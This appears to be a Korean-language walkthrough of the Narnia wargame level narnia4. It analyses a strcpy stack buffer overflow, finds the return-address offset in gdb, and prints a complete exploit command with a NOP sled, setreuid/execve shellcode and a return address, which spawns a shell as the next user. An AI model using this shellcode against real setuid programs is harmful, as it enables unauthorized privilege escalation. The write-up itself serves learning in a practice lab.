## 1. 문제 확인
- ID : narnia4
- Target : /narnia/narnia4
- Flag : /etc/narnia_pass/narnia5
```
narnia4@gibson:/narnia$ ./narnia4
narnia4@gibson:/narnia$ ./narnia4 testtest
narnia4@gibson:/narnia$
```

<br/><br/>
## 2. 취약점 분석
### 2.1 Source Code
- 프로그램 실행 인자를 받아서 처리하지만, 아무런 출력은 하지 않음
![](https://velog.velcdn.com/images/g4nzzi/post/aad4b061-e74e-4124-beb2-b5e8fdb186ad/image.png)
### 2.2 Code 분석
- 전역변수 environ 
	
    전역변수 environ은 main()함수 스택 메모리 외부에 위치하며, 프로그램 실행 시 memset()에 의해 값이 "0"으로 초기화됨

- 지역변수 i, buffer
main()함수의 지역변수 i와 buffer[]가 선언되어 있으며, 공격에 buffer 배열을 이용할 수 있음

- strcpy()
	
    프로그램 실행인자의 개수(argc)가 1개 이상이면 입력된 값이 buffer로 복사되며 복사되는 데이터 사이즈가 지정되지 않았기 때문에 **overflow 취약점**이 존재함

<br/><br/>
## 3. Exploit
- gdb로 main()함수의 [Ret Address] 주소위치 확인 결과 "CCCC"(0x43434343)로 덮어써졌으니, buffer[] 시작주소로부터 264Byte 떨어진 위치로 확인
```
(gdb) r $(python3 -c 'print("A"*260 + "BBBB" + "CCCC" + "DDDD")')
Starting program: /narnia/narnia4 $(python3 -c 'print("A"*260 + "BBBB" + "CCCC" + "DDDD")')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
(gdb)

```
- strcpy()로 buffer[]에 입력 데이터가 복사된 후 ESP 레지스터를 확인하여 (NOP + Shellcode)가 위치할 적당한 메모리 주소를 확인함(예: 0xffffd4fc)
```
(gdb) x/300wx $esp

...
0xffffd490:     0x00000000      0x00000000      0x1c000000      0x8208f99e
0xffffd4a0:     0x610d7c54      0xb09f1610      0x696c68bd      0x00363836
0xffffd4b0:     0x00000000      0x00000000      0x6e2f0000      0x696e7261
0xffffd4c0:     0x616e2f61      0x61696e72      0x41410034      0x41414141
0xffffd4d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd4e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd4f0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd500:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd510:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd520:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd530:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd540:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd550:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd560:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd570:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd580:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd590:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5c0:     0x41414141      0x41414141      0x41414141      0x42424141
0xffffd5d0:     0x43434242      0x44444343      0x00004444      0x00000000
0xffffd5e0:     0x00000000      0x00000000      0x00000000      0x00000000

```

- 실행인자(argv)로 (NOP + Shellcode)**[264Byte]** + (Ret Address)**[4Byte]**를 입력하면 쉘코드가 실행됨
```
narnia4@gibson:/narnia$ ./narnia4 `echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80\xfc\xd4\xff\xff"`
$ id
uid=14005(narnia5) gid=14004(narnia4) groups=14004(narnia4)
$
```
